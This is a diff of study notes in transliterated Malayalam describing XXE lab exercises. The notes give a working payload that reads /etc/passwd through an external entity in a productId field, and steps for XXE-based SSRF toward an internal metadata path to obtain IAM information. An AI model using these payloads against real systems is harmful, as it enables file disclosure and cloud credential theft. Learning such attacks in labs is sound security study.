@@ -16,9 +16,9 @@
 -->ini request il nokiyal kanam xml use chythan stock check chyunathen
 -->so aa request repeater il viduka.enit aa xml format il puthiya oru line of code add chyuka.athayath 
 
-<?xml version="1.0" encoding="UTF-8"?>           thazhe aayi:
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    add chyanam
- enit athile <productId>&xxe;</productId> il 5 enn kanum athu remove chyth &xxe;
+	<?xml version="1.0" encoding="UTF-8"?>        
+	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    
+add chyanam enit athile <productId>&xxe;</productId> il 5 enn kanum athu remove chyth &xxe;
  enn add chyuka.apol passwd okke response il kitum
  
 #### Exploiting XXE to perform SSRF attacks:
@@ -29,3 +29,9 @@
 enit <productId>&xxe;</productId> kodukuka enit send adikumbol adutha directory lek pokendath kanikum so ath add chyth polkika athayath ee ip address nushesham slash itt url pole /latest/iam..../admin koduth poyal informations kitum
 -->ithil main aayit vendath enthenal ip range kandupidikuka ennathan
 -->so main aayi server run chyuna ip kandupidikanam
+
+=============================================
+PAYLOAD :
+```
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
+```
